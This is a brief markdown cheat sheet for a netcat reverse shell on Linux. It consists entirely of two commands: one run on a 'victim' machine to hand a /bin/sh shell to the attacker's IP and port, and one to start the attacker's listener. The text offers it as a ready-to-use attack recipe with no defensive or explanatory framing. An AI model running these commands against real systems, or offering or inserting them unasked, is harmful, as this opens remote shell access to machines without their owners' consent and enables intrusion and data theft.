# Reverse Shell Cheat Sheet

## Netcat linux reverse shell

###Upload to victim
```nc -e /bin/sh <your_ip> <port>```
###Listener
```nc -vv -l -p <port>```
